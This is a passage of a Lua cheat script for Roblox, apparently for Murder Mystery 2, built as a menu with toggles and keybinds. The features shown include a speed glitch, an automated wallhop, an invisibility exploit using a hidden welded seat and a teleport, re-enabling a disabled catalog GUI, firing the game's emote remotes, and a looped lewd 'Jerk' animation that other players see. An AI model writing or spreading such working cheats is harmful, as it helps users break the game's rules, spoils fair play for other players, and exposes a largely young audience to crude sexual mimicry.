    sg.ResetOnSpawn = false
    sg.Parent = targetParent

    local box = Instance.new("Frame")
    box.Size = UDim2.new(0, 160, 0, 56)
    box.Position = UDim2.new(0.5, -80, 0, 15)
    box.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    box.BackgroundTransparency = 0.2
    box.BorderSizePixel = 0
    box.Parent = sg

    local corner = Instance.new("UICorner", box)
    corner.CornerRadius = UDim.new(0, 10)

    local stroke = Instance.new("UIStroke", box)
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(48, 255, 106)
    stroke.Transparency = 0.3

    local timerLbl = Instance.new("TextLabel", box)
    timerLbl.Size = UDim2.new(1, 0, 0.5, 0)
    timerLbl.Position = UDim2.new(0, 0, 0, 0)
    timerLbl.BackgroundTransparency = 1
    timerLbl.Font = Enum.Font.GothamBold
    timerLbl.TextSize = 13
    timerLbl.TextColor3 = Color3.new(1, 1, 1)
    timerLbl.Text = "TIME: --"

    local chanceLbl = Instance.new("TextLabel", box)
    chanceLbl.Size = UDim2.new(1, 0, 0.5, 0)
    chanceLbl.Position = UDim2.new(0, 0, 0.5, 0)
    chanceLbl.BackgroundTransparency = 1
    chanceLbl.Font = Enum.Font.GothamBold
    chanceLbl.TextSize = 12
    chanceLbl.TextColor3 = Color3.fromRGB(48, 255, 106)
    chanceLbl.Text = "CHANCE: SOON"

    RanaxTimerGui = sg

    task.spawn(function()
        while RanaxTimerGui and RanaxTimerGui.Parent do
            pcall(function()
                local t = workspace:FindFirstChild("RoundTimerPart") and workspace.RoundTimerPart:FindFirstChild("SurfaceGui") and workspace.RoundTimerPart.SurfaceGui:FindFirstChild("Timer")
                if t then timerLbl.Text = "TIME: " .. string.upper(t.Text) end
            end)
            pcall(function()
                local c = LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild("MainGUI") and LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby") and LocalPlayer.PlayerGui.MainGUI.Lobby:FindFirstChild("Chance")
                if c then chanceLbl.Text = "CHANCE: " .. string.upper(c.Text) end
            end)
            task.wait(0.5)
        end
    end)
end

MiscTab:Toggle({
    Title = "Game Status HUD",
    Desc = "Displays game timer and murderer chance box at the top of your screen",
    Icon = "clock",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        toggleTimerHUD(state)
        notify("HUD", "Status HUD " .. (state and "ON" or "OFF"), 2, "clock")
    end
})

LocalPlayer.CharacterAdded:Connect(function()
    if _G.TryhardToolsEnabled then
        task.wait(1)
        giveTools()
        autoConfigSprayPaint()
    end
end)

MiscTab:Divider()

-- ==================== SPEED GLITCH (TOY / GG SIGN ONLY) ====================
_G.SpeedGlitchActive = false
_G.SpeedGlitchBoost = 50
_G.SpeedGlitchHeartbeatConn = nil

local function isSpeedGlitchToolValid(char)
    if not char then return false end
    local tool = nil
    for _, item in ipairs(char:GetChildren()) do
        if item:IsA("Tool") then
            tool = item
            break
        end
    end
    if not tool then return false end
    
    local name = tool.Name:lower()
    -- Knife / Murderer check
    if name:find("knife") or name:find("slash") or name:find("blade") or name:find("sword") then
        return false
    end
    -- Gun / Sheriff / Revolver check
    if name:find("gun") or name:find("revolver") or name:find("shoot") then
        return false
    end
    -- Normal Bomb and Gold Bomb check
    if name:find("bomb") then
        return false
    end
    
    -- Only other items (GGSign, toys, etc.)
    return true
end

local function startSpeedGlitchEngine()
    if _G.SpeedGlitchHeartbeatConn then
        _G.SpeedGlitchHeartbeatConn:Disconnect()
        _G.SpeedGlitchHeartbeatConn = nil
    end
    
    _G.SpeedGlitchHeartbeatConn = RunService.Heartbeat:Connect(function()
        if not _G.SpeedGlitchActive then return end
        local char = LocalPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not (hum and hum.Health > 0) then return end
        
        local valid = isSpeedGlitchToolValid(char)
        if not valid then
            if hum.WalkSpeed > 16 then
                hum.WalkSpeed = 16
            end
            return
        end
        
        local state = hum:GetState()
        local inAir = (state == Enum.HumanoidStateType.Jumping or state == Enum.HumanoidStateType.Freefall)
        if inAir then
            if hum.MoveDirection.Magnitude > 0.05 then
                local boost = _G.SpeedGlitchBoost or 50
                hum.WalkSpeed = 16 + boost
            end
        else
            if hum.WalkSpeed > 16 then
                hum.WalkSpeed = 16
            end
        end
    end)
end

local function stopSpeedGlitchEngine()
    if _G.SpeedGlitchHeartbeatConn then
        _G.SpeedGlitchHeartbeatConn:Disconnect()
        _G.SpeedGlitchHeartbeatConn = nil
    end
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum and hum.WalkSpeed > 16 then
        hum.WalkSpeed = 16
    end
end

local function toggleSpeedGlitch(forcedState)
    local newState
    if forcedState ~= nil then
        newState = forcedState
    else
        newState = not (_G.SpeedGlitchActive or false)
    end
    _G.SpeedGlitchActive = newState
    if newState then
        startSpeedGlitchEngine()
        notify("Speed Glitch", "Speed Glitch: ON", 2, "zap")
    else
        stopSpeedGlitchEngine()
        notify("Speed Glitch", "Speed Glitch: OFF", 2)
    end
    if _G.SpeedGlitchToggleRef then
        pcall(function()
            if typeof(_G.SpeedGlitchToggleRef.Set) == "function" then
                _G.SpeedGlitchToggleRef:Set(newState)
            elseif typeof(_G.SpeedGlitchToggleRef.SetValue) == "function" then
                _G.SpeedGlitchToggleRef:SetValue(newState)
            end
        end)
    end
end

local _lastSpeedGlitchPress = 0
local function handleSpeedGlitchPress()
    if tick() - _lastSpeedGlitchPress < 0.2 then return end
    _lastSpeedGlitchPress = tick()
    toggleSpeedGlitch()
end

_G.SpeedGlitchToggleRef = MiscTab:Toggle({
    Title = "Speed Glitch",
    Desc = "Boosts speed while jumping with toys (Disabled on Knife, Gun & Bombs)",
    Icon = "zap",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if state ~= _G.SpeedGlitchActive then
            toggleSpeedGlitch(state)
        end
    end
})

UIElements.SpeedGlitchBoost = MiscTab:Slider({
    Title = "Speed Glitch Boost",
    Desc = "Extra speed added while jumping with allowed toys",
    Step = 5,
    Value = {
        Min = 10,
        Max = 120,
        Default = 50,
    },
    Callback = function(val)
        _G.SpeedGlitchBoost = val
    end
})

_G.SpeedGlitchKeybindRef = nil
_G.SpeedGlitchKeybindRef = MiscTab:Keybind({
    Title = "Speed Glitch Keybind",
    Desc = "Toggles speed glitch on / off (Press Delete for None)",
    Value = KeybindValues.SpeedGlitchKeybind or "None",
    Callback = function(v)
        KeybindValues.SpeedGlitchKeybind = tostring(v):gsub("Enum.KeyCode.", "")
        if tostring(v) == "Delete" or tostring(v) == "Backspace" or tostring(v) == "None" or v == nil then
            pcall(function()
                if _G.SpeedGlitchKeybindRef and _G.SpeedGlitchKeybindRef.Set then
                    _G.SpeedGlitchKeybindRef:Set("None")
                end
            end)
            return
        end
        handleSpeedGlitchPress()
    end
})
UIElements.SpeedGlitchKeybind = _G.SpeedGlitchKeybindRef

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if UserInputService:GetFocusedTextBox() then return end
    local bind = KeybindValues.SpeedGlitchKeybind
    if bind and bind ~= "None" and bind ~= "" then
        if input.KeyCode and input.KeyCode.Name == bind then
            handleSpeedGlitchPress()
        end
    end
end)


-- ==================== WALLHOP SYSTEM (FLICK ENGINE) ====================
_G.WallhopKeybind = KeybindValues.WallhopKeybind or "None"
_G.WallhopTurnTime = 0.06
_G.WallhopAngle = 90
_G.WallhopCameraSnap = true
_G.WallhopAutoJump = true
local _wallhopInProgress = false

local function executeWallhop()
    if _wallhopInProgress then return end
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not (char and hrp and hum and hum.Health > 0) then return end

    _wallhopInProgress = true

    -- Auto Jump right when wallhop flick triggers
    if _G.WallhopAutoJump ~= false and hum then
        hum.Jump = true
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
    end

    local origHrpCF = hrp.CFrame
    local cam = Workspace.CurrentCamera
    local origCamCF = cam and cam.CFrame
    local origAutoRotate = hum.AutoRotate
    hum.AutoRotate = false

    local turnTime = math.clamp(tonumber(_G.WallhopTurnTime) or 0.06, 0.01, 0.3)
    local angleDeg = tonumber(_G.WallhopAngle) or 90
    local steps = math.max(1, math.round((turnTime / 2) / 0.016))

    local rightRotation = CFrame.Angles(0, math.rad(-angleDeg), 0)
    local targetHrpCF = CFrame.new(hrp.Position) * (origHrpCF.Rotation * rightRotation)

    -- Phase 1: Flick right
    for i = 1, steps do
        if not (hrp and hrp.Parent) then break end
        local alpha = (i / steps) ^ 0.75
        local newRot = origHrpCF:Lerp(targetHrpCF, alpha)
        hrp.CFrame = CFrame.new(hrp.Position) * newRot.Rotation

        if _G.WallhopCameraSnap and cam and origCamCF then
            local targetCamCF = CFrame.new(cam.CFrame.Position) * (origCamCF.Rotation * rightRotation)
            cam.CFrame = origCamCF:Lerp(targetCamCF, alpha)
        end
        RunService.RenderStepped:Wait()
    end

    task.wait(math.clamp(turnTime * 0.15, 0.005, 0.02))

    -- Phase 2: Return to forward
    local apexHrpCF = hrp.CFrame
    local apexCamCF = cam and cam.CFrame
    local returnTargetHrp = CFrame.new(hrp.Position) * origHrpCF.Rotation

    for i = 1, steps do
        if not (hrp and hrp.Parent) then break end
        local alpha = (i / steps) ^ 0.75
        local newRot = apexHrpCF:Lerp(returnTargetHrp, alpha)
        hrp.CFrame = CFrame.new(hrp.Position) * newRot.Rotation

        if _G.WallhopCameraSnap and cam and apexCamCF and origCamCF then
            local returnTargetCam = CFrame.new(cam.CFrame.Position) * origCamCF.Rotation
            cam.CFrame = apexCamCF:Lerp(returnTargetCam, alpha)
        end
        RunService.RenderStepped:Wait()
    end

    if hum and hum.Parent then hum.AutoRotate = origAutoRotate end
    _wallhopInProgress = false
end
_G.executeWallhop = executeWallhop

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe or UserInputService:GetFocusedTextBox() then return end
    local bind = KeybindValues.WallhopKeybind
    if bind and bind ~= "None" and bind ~= "" then
        if input.KeyCode and input.KeyCode.Name == bind then
            pcall(executeWallhop)
        end
    end
end)

-- ==================== JERK ANIMATION ENGINE ====================
_G.JerkActive = false
_G.JerkSpeed = 1.0
local _jerkTrack = nil
local _jerkLoopThread = nil
local _syncingJerkUI = false

local function isR15(char)
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    return (hum and hum.RigType == Enum.HumanoidRigType.R15) or false
end

local function stopJerk()
    _G.JerkActive = false
    if _jerkTrack then
        pcall(function() _jerkTrack:Stop() end)
        _jerkTrack = nil
    end
    if _jerkLoopThread then
        task.cancel(_jerkLoopThread)
        _jerkLoopThread = nil
    end
end

local function startJerk()
    stopJerk()
    _G.JerkActive = true

    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not (char and hum and hum.Health > 0) then return end

    local is_r15 = isR15(char)
    local anim = Instance.new("Animation")
    anim.AnimationId = is_r15 and "rbxassetid://698251653" or "rbxassetid://148840371"

    local ok, track = pcall(function() return hum:LoadAnimation(anim) end)
    if not (ok and track) then return end

    track.Priority = Enum.AnimationPriority.Action4
    track.Looped = not is_r15
    _jerkTrack = track

    local speed = tonumber(_G.JerkSpeed) or 1.0

    if not is_r15 then
        track:Play()
        track:AdjustSpeed(0.85 * speed)
        track.TimePosition = 0.6
    else
        track:Play()
        track:AdjustSpeed(0)
        track.TimePosition = 0.6
        _jerkLoopThread = task.spawn(function()
            local tStart = 0.58
            local tEnd   = 0.74
            local forward = true
            while _G.JerkActive do
                if not (_jerkTrack and _jerkTrack.IsPlaying and hum and hum.Health > 0) then
                    local c = LocalPlayer.Character
                    local h = c and c:FindFirstChildOfClass("Humanoid")
                    if h and h.Health > 0 then
                        local ok2, tr2 = pcall(function() return h:LoadAnimation(anim) end)
                        if ok2 and tr2 then
                            tr2.Priority = Enum.AnimationPriority.Action4
                            tr2:Play()
                            tr2:AdjustSpeed(0)
                            _jerkTrack = tr2
                        end
                    end
                end
                local currentPos = (_jerkTrack and _jerkTrack.TimePosition) or tStart
                local step = 0.04 * (tonumber(_G.JerkSpeed) or 1.0)
                if forward then
                    currentPos = currentPos + step
                    if currentPos >= tEnd then
                        currentPos = tEnd
                        forward = false
                    end
                else
                    currentPos = currentPos - step
                    if currentPos <= tStart then
                        currentPos = tStart
                        forward = true
                    end
                end
                if _jerkTrack then
                    pcall(function() _jerkTrack.TimePosition = currentPos end)
                end
                task.wait(0.016)
            end
        end)
    end
end

local function toggleJerk(force)
    local target = (force ~= nil) and force or (not _G.JerkActive)
    if target == _G.JerkActive and force ~= nil then return end
    if target then
        startJerk()
        notify("Jerk", "Jerk: ON", 2, "smile")
    else
        stopJerk()
        notify("Jerk", "Jerk: OFF", 2)
    end
    if UIElements.JerkToggle and UIElements.JerkToggle.Set and not _syncingJerkUI then
        _syncingJerkUI = true
        pcall(function() UIElements.JerkToggle:Set(target) end)
        _syncingJerkUI = false
    end
end
_G.toggleJerk = toggleJerk

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe or UserInputService:GetFocusedTextBox() then return end
    local bind = KeybindValues.JerkKeybind or "J"
    if bind and bind ~= "None" and bind ~= "" then
        if input.KeyCode and input.KeyCode.Name == bind then
            toggleJerk()
        end
    end
end)

LocalPlayer.CharacterAdded:Connect(function()
    if _G.JerkActive then
        stopJerk()
        if UIElements.JerkToggle and UIElements.JerkToggle.Set and not _syncingJerkUI then
            _syncingJerkUI = true
            pcall(function() UIElements.JerkToggle:Set(false) end)
            _syncingJerkUI = false
        end
    end
end)

MiscTab:Divider()
MiscTab:Section({ Title = "Movement & Fun Features", TextSize = 15 })

-- Wallhop
local WallhopKeybind
WallhopKeybind = MiscTab:Keybind({
    Title = "Wallhop Keybind",
    Desc = "Flicks right and back instantly for smooth wallhopping (Press Delete for None)",
    Value = KeybindValues.WallhopKeybind or "None",
    Callback = function(v)
        local keyName = tostring(v):gsub("Enum.KeyCode.", "")
        if keyName == "Delete" or keyName == "Backspace" or keyName == "None" or v == nil then
            KeybindValues.WallhopKeybind = "None"
            pcall(function() if WallhopKeybind and WallhopKeybind.SetValue then WallhopKeybind:SetValue("None") end end)
        else
            KeybindValues.WallhopKeybind = keyName
        end
    end
})
UIElements.WallhopKeybind = WallhopKeybind

UIElements.WallhopAutoJump = MiscTab:Toggle({
    Title = "Wallhop Auto Jump",
    Desc = "Automatically jumps when wallhop flick is triggered",
    Default = _G.WallhopAutoJump ~= false,
    Callback = function(v)
        _G.WallhopAutoJump = v
    end
})

UIElements.WallhopTurnTime = MiscTab:Slider({
    Title = "Wallhop Flick Speed",
    Desc = "Turn flick duration in seconds (lower = faster flick)",
    Step = 0.01,
    Value = {
        Min = 0.02,
        Max = 0.20,
        Default = _G.WallhopTurnTime or 0.06,
    },
    Callback = function(v)
        _G.WallhopTurnTime = v
        _G.WallhopFlickSpeed = v
    end
})

UIElements.WallhopCameraSnap = MiscTab:Toggle({
    Title = "Wallhop Camera Snap",
    Desc = "Rotates camera along with the player flick",
    Default = _G.WallhopCameraSnap ~= false,
    Callback = function(v) _G.WallhopCameraSnap = v end
})

-- Jerk
UIElements.JerkToggle = MiscTab:Toggle({
    Title = "Jerk",
    Desc = "Continuous jerk animation (works with R6 and R15 while moving)",
    Icon = "smile",
    Default = false,
    Callback = function(v)
        if _syncingJerkUI then return end
        if v ~= _G.JerkActive then
            toggleJerk(v)
        end
    end
})

local JerkKeybind
JerkKeybind = MiscTab:Keybind({
    Title = "Jerk Keybind",
    Desc = "Keybind to toggle Jerk ON / OFF (Press Delete for None)",
    Value = KeybindValues.JerkKeybind or "J",
    Callback = function(v)
        local keyName = tostring(v):gsub("Enum.KeyCode.", "")
        if keyName == "Delete" or keyName == "Backspace" or keyName == "None" or v == nil then
            KeybindValues.JerkKeybind = "None"
            pcall(function() if JerkKeybind and JerkKeybind.SetValue then JerkKeybind:SetValue("None") end end)
        else
            KeybindValues.JerkKeybind = keyName
        end
    end
})
UIElements.JerkKeybind = JerkKeybind

UIElements.JerkSpeed = MiscTab:Slider({
    Title = "Jerk Speed",
    Desc = "Animation playback speed multiplier",
    Step = 0.1,
    Value = {
        Min = 0.2,
        Max = 4.0,
        Default = _G.JerkSpeed or 1.0,
    },
    Callback = function(v)
        _G.JerkSpeed = v
        if _jerkTrack and _jerkTrack.IsPlaying and not isR15(LocalPlayer.Character) then
            pcall(function() _jerkTrack:AdjustSpeed(0.85 * v) end)
        end
    end
})

MiscTab:Divider()

local InvisibleKeybind
InvisibleKeybind = MiscTab:Keybind({
    Title = "Turn Invisible",
    Desc = "Turns you Invisible making it so no one can see you. (Press Delete for None)",
    Value = KeybindValues.InvisibleKeybind or "None",
    Callback = function(v)
        KeybindValues.InvisibleKeybind = tostring(v):gsub("Enum.KeyCode.", "")
        if tostring(v) == "Delete" or tostring(v) == "Backspace" or tostring(v) == "None" or v == nil then
            pcall(function() if InvisibleKeybind and InvisibleKeybind.SetValue then InvisibleKeybind:SetValue("None") end end)
            return
        end
        if not _G.InvisOn then
            _G.InvisOn = true
            
            local character = LocalPlayer.Character
            if not character then return end
            
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            local hrp = character:FindFirstChild("HumanoidRootPart")
            if not humanoid or not hrp then return end
            
            _G.SavedCFrame = hrp.CFrame
            _G.OriginalCameraSubject = Workspace.CurrentCamera.CameraSubject
            _G.OriginalAutoRotate = humanoid.AutoRotate
            _G.Humanoid = humanoid
            
            local function isTool(part)
                local parent = part.Parent
                while parent and parent ~= character do
                    if parent:IsA("Tool") then
                        return true
                    end
                    parent = parent.Parent
                end
                return false
            end
            
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") and not isTool(part) then
                    part.LocalTransparencyModifier = 1
                end
            end
            
            _G.InvisConnection = character.DescendantAdded:Connect(function(descendant)
                if descendant:IsA("BasePart") and not isTool(descendant) then
                    descendant.LocalTransparencyModifier = 1
                end
            end)
            
            -- Outline kaldirildi (beyaz cember cikiyordu)
            
            character:MoveTo(Vector3.new(-25.95, 84, 3537.55))
            task.wait(0.15)
            
            local seat = Instance.new("Seat", Workspace)
            seat.Anchored = false
            seat.CanCollide = false
            seat.Name = "invischair"
            seat.Transparency = 1
            seat.Position = Vector3.new(-25.95, 84, 3537.55)
            
            Workspace.CurrentCamera.CameraSubject = hrp
            
            local weld = Instance.new("Weld", seat)
            weld.Part0 = seat
            weld.Part1 = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
            
            task.wait()
            seat.CFrame = _G.SavedCFrame
            
            local UserInputService = game:GetService("UserInputService")
            
            _G.RotationConnection = game:GetService("RunService").RenderStepped:Connect(function()
                if not _G.InvisOn or not seat then return end
                
                local hum = _G.Humanoid
                if not hum then return end
                
                if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
                    hum.AutoRotate = false
                    local cam = Workspace.CurrentCamera
                    local look = cam.CFrame.LookVector
                    look = Vector3.new(look.X, 0, look.Z).Unit
                    if look.Magnitude > 0 then
                        seat.CFrame = CFrame.new(seat.Position, seat.Position + look)
                    end
                else
                    hum.AutoRotate = true
                end
            end)
            
        else
            _G.InvisOn = false
            
            if _G.InvisConnection then
                _G.InvisConnection:Disconnect()
                _G.InvisConnection = nil
            end
            
            if _G.RotationConnection then
                _G.RotationConnection:Disconnect()
                _G.RotationConnection = nil
            end
            
            local character = LocalPlayer.Character
            if character then
                for _, part in pairs(character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.LocalTransparencyModifier = 0
                    end
                end
                
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.AutoRotate = _G.OriginalAutoRotate ~= nil and _G.OriginalAutoRotate or true
                end
                
                if _G.OriginalCameraSubject then
                    Workspace.CurrentCamera.CameraSubject = _G.OriginalCameraSubject
                end
            end
            
            if _G.Outline then
                _G.Outline:Destroy()
                _G.Outline = nil
            end
            
            local invisChair = Workspace:FindFirstChild("invischair")
            if invisChair then
                invisChair:Destroy()
            end
            
            _G.SavedCFrame = nil
            _G.OriginalCameraSubject = nil
            _G.OriginalAutoRotate = nil
            _G.Humanoid = nil
        end
    end
})
UIElements.InvisibleKeybind = InvisibleKeybind

MiscTab:Divider()

local OutfitToggle = MiscTab:Toggle({
    Title = "Outfits Toggle",
    Desc = "Toggles outfit GUI in KMM, might work when Season 2 comes out",
    Icon = "check",
    Type = "Checkbox",
    Value = false,
    Callback = function(state)
        if state then
            getgenv().OutfitGUIToggleActive = true
            
            local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
            local gameTopbar = PlayerGui:WaitForChild("GameTopbar")
            local originalScript = gameTopbar:FindFirstChild("CatalogV4")
            if originalScript and originalScript:IsA("LocalScript") then
                originalScript.Disabled = true
                getgenv().OriginalCatalogScript = originalScript
            end
            
            task.wait(0.2)
            
            local function SetupButton()
                local container = gameTopbar:FindFirstChild("Container")
                if not container then return end
                
                local avatar = container:FindFirstChild("Avatar")
                if not avatar then return end
                
                avatar.Visible = true
                
                local button = avatar:FindFirstChild("Container") and avatar.Container:FindFirstChild("Button")
                if button and not getgenv().OutfitButtonConnection then
                    getgenv().OutfitButtonConnection = button.Activated:Connect(function()
                        if not getgenv().OutfitGUIToggleActive then return end
                        
                        local catalogGUI = PlayerGui:FindFirstChild("CatalogGUI")
                        if not catalogGUI then return end
                        
                        local newState = not catalogGUI.Enabled
                        catalogGUI.Enabled = newState
                        
                        if newState then
                            getgenv().OutfitWasOpened = true
                            
                            local CatalogCreator = ReplicatedStorage:FindFirstChild("CatalogAvatarCreator")
                            if CatalogCreator then
                                local Events = CatalogCreator:FindFirstChild("Events")
                                if Events then
                                    local openCatalog = Events:FindFirstChild("ClientToggleOpenCatalog")
                                    if openCatalog then
                                        openCatalog:Fire(true)
                                    end
                                end
                                local toggleUI = CatalogCreator:FindFirstChild("ClientToggleUIVisible")
                                if toggleUI then
                                    toggleUI:Fire(true)
                                end
                            end
                        else
                            getgenv().OutfitWasOpened = false
                        end
                    end)
                end
            end
            
            SetupButton()
            
            getgenv().OutfitLoop = task.spawn(function()
                while getgenv().OutfitGUIToggleActive do
                    task.wait(0.5)
                    local container = gameTopbar:FindFirstChild("Container")
                    if container then
                        local avatar = container:FindFirstChild("Avatar")
                        if avatar then
                            avatar.Visible = true
                        end
                    end
                    
                    if getgenv().OutfitWasOpened then
                        local catalogGUI = PlayerGui:FindFirstChild("CatalogGUI")
                        if catalogGUI and not catalogGUI.Enabled then
                            catalogGUI.Enabled = true
                        end
                    end
                end
            end)
        else
            getgenv().OutfitGUIToggleActive = false
            getgenv().OutfitWasOpened = false
            
            if getgenv().OriginalCatalogScript then
                getgenv().OriginalCatalogScript.Disabled = false
                getgenv().OriginalCatalogScript = nil
            end
            
            if getgenv().OutfitButtonConnection then
                getgenv().OutfitButtonConnection:Disconnect()
                getgenv().OutfitButtonConnection = nil
            end
            
            if getgenv().OutfitLoop then
                task.cancel(getgenv().OutfitLoop)
                getgenv().OutfitLoop = nil
            end
            
            local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
            if PlayerGui then
                local catalogGUI = PlayerGui:FindFirstChild("CatalogGUI")
                if catalogGUI then
                    catalogGUI.Enabled = false
                end
            end
        end
    end
})
-------------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------------
-- ==================== RANAX EMOTE PLAYER SYSTEM ====================
do
    local EMOTES_DATA = {
        ["Zen (MM2)"] = {
            Remote = "zen",
            R6 = "rbxassetid://313762630",
            R15 = "rbxassetid://71136284141200",
            Looped = true
        },
        ["Ninja (MM2)"] = {
            Remote = "ninja",
            R6 = "rbxassetid://204292303",
            R15 = "rbxassetid://656118341",
            Looped = true
        },
        ["Floss (MM2)"] = {
            Remote = "floss",
            R6 = "rbxassetid://5918726674",
            R15 = "rbxassetid://10714340543",
            Looped = true
        },
        ["Dab (MM2)"] = {
            Remote = "dab",
            R6 = "rbxassetid://183412246",
            R15 = "rbxassetid://10714345598",
            Looped = false
        },
        ["Zombie (MM2)"] = {
            Remote = "zombie",
            R6 = "rbxassetid://616158929",
            R15 = "rbxassetid://3303165245",
            Looped = true
        },
        ["Sit (MM2)"] = {
            Remote = "sit",
            R6 = "rbxassetid://179224234",
            R15 = "rbxassetid://2506281708",
            Looped = true
        },
        ["Hero (MM2)"] = {
            Remote = "hero",
            R6 = "rbxassetid://184574340",
            R15 = "rbxassetid://3303162803",
            Looped = true
        },
        ["Headless (MM2)"] = {
            Remote = "headless",
            R6 = "rbxassetid://121572214",
            R15 = "rbxassetid://3303162803",
            Looped = true
        },
        ["Kazotsky Kick"] = {
            R6 = "rbxassetid://4920677107",
            R15 = "rbxassetid://5915712534",
            Looped = true
        },
        ["CaramellDansen"] = {
            R6 = "rbxassetid://4920680645",
            R15 = "rbxassetid://4920680645",
            Looped = true
        },
        ["Distraction Dance"] = {
            R6 = "rbxassetid://507771019",
            R15 = "rbxassetid://5915693812",
            Looped = true
        },
        ["T-Pose"] = {
            R6 = "rbxassetid://4920678850",
            R15 = "rbxassetid://4920678850",
            Looped = true
        },
        ["Griddy"] = {
            R6 = "rbxassetid://10714348656",
            R15 = "rbxassetid://10714348656",
            Looped = true
        },
        ["Billy Bounce"] = {
            R6 = "rbxassetid://10714344040",
            R15 = "rbxassetid://10714344040",
            Looped = true
        },
        ["Default Dance"] = {
            R6 = "rbxassetid://507771019",
            R15 = "rbxassetid://507771019",
            Looped = true
        },
        ["Dance 1"] = {
            R6 = "rbxassetid://182491185",
            R15 = "rbxassetid://507771019",
            Looped = true
        },
        ["Dance 2"] = {
            R6 = "rbxassetid://182491277",
            R15 = "rbxassetid://507771958",
            Looped = true
        },
        ["Dance 3"] = {
            R6 = "rbxassetid://182491368",
            R15 = "rbxassetid://507772104",
            Looped = true
        },
        ["Wave"] = {
            R6 = "rbxassetid://128777973",
            R15 = "rbxassetid://507770239",
            Looped = false
        },
        ["Laugh"] = {
            R6 = "rbxassetid://129423131",
            R15 = "rbxassetid://507770818",
            Looped = false
        },
        ["Cheer"] = {
            R6 = "rbxassetid://129423030",
            R15 = "rbxassetid://507770677",
            Looped = false
        },
        ["Point"] = {
            R6 = "rbxassetid://128853357",
            R15 = "rbxassetid://507770453",
            Looped = false
        }
    }

    local emoteOrder = {
        "Zen (MM2)",
        "Ninja (MM2)",
        "Floss (MM2)",
        "Dab (MM2)",
        "Zombie (MM2)",
        "Sit (MM2)",
        "Hero (MM2)",
        "Headless (MM2)",
        "Kazotsky Kick",
        "CaramellDansen",
        "Distraction Dance",
        "T-Pose",
        "Griddy",
        "Billy Bounce",
        "Default Dance",
        "Dance 1",
        "Dance 2",
        "Dance 3",
        "Wave",
        "Laugh",
        "Cheer",
        "Point"
    }

    _G.RanaxSelectedEmote = _G.RanaxSelectedEmote or "Zen (MM2)"
    _G.RanaxEmoteLoop = (_G.RanaxEmoteLoop == nil) and true or _G.RanaxEmoteLoop
    _G.RanaxEmoteWalk = (_G.RanaxEmoteWalk == nil) and true or _G.RanaxEmoteWalk
    _G.RanaxEmoteSpeed = _G.RanaxEmoteSpeed or 1.0
    _G.RanaxEmoteActive = false
    _G.RanaxEmoteSpammer = false

    local _currentTrack = nil
    local _spammerThread = nil

    -- Universal MM2 Emote Trigger: supports BindableEvent, RemoteEvent & Animate Bindable
    local function fireMM2EmoteEvent(arg)
        -- 1. Native MM2 ReplicatedStorage.PlayEmote (BindableEvent / RemoteEvent)
        pcall(function()
            local pe = ReplicatedStorage:FindFirstChild("PlayEmote")
            if pe then
                if pe:IsA("BindableEvent") then
                    pe:Fire(arg)
                elseif pe:IsA("RemoteEvent") then
                    pe:FireServer(arg)
                end
            end
        end)

        -- 2. Check ReplicatedStorage.Remotes descendants
        pcall(function()
            local remotes = ReplicatedStorage:FindFirstChild("Remotes")
            if remotes then
                for _, d in ipairs(remotes:GetDescendants()) do
                    if d.Name == "PlayEmote" or d.Name == "Emote" then
                        if d:IsA("BindableEvent") then
                            pcall(function() d:Fire(arg) end)
                        elseif d:IsA("RemoteEvent") then
                            pcall(function() d:FireServer(arg) end)
                        end
                    end
                end
            end
        end)

        -- 3. Check Character Animate PlayEmote
        pcall(function()
            local char = LocalPlayer.Character
            local anim = char and char:FindFirstChild("Animate")
            local pe = anim and (anim:FindFirstChild("PlayEmote") or anim:FindFirstChild("Emote"))
            if pe then
                if pe:IsA("BindableFunction") then
                    pcall(function() pe:Invoke(arg) end)
                elseif pe:IsA("BindableEvent") then
                    pcall(function() pe:Fire(arg) end)
                end
            end
        end)
    end

    local function stopEmoteInternal()
        _G.RanaxEmoteActive = false
        if _spammerThread then
            task.cancel(_spammerThread)
            _spammerThread = nil
        end
        if _currentTrack then
            pcall(function()
                _currentTrack:Stop(0.15)
                _currentTrack:Destroy()
            end)
            _currentTrack = nil
        end
        _G.RanaxCurrentEmoteTrack = nil

        -- Stop MM2 native emote
        fireMM2EmoteEvent("")
        fireMM2EmoteEvent("none")
    end
    _G.RanaxStopEmote = stopEmoteInternal

    local function playEmoteInternal(emoteName)
        emoteName = emoteName or _G.RanaxSelectedEmote or "Zen (MM2)"
        local data = EMOTES_DATA[emoteName]
        if not data then return end

        stopEmoteInternal()
        task.wait(0.04)

        local char = LocalPlayer.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not (hum and hum.Health > 0) then return end

        -- 1. If it has an MM2 Remote name (Zen, Ninja, Floss, Dab, Sit, Zombie, Hero, Headless):
        if data.Remote and data.Remote ~= "" then
            fireMM2EmoteEvent(data.Remote)
            _G.RanaxEmoteActive = true
            return
        end

        -- 2. Standard Roblox Humanoid emotes (wave, laugh, cheer, point)
        local rawLower = tostring(emoteName):lower()
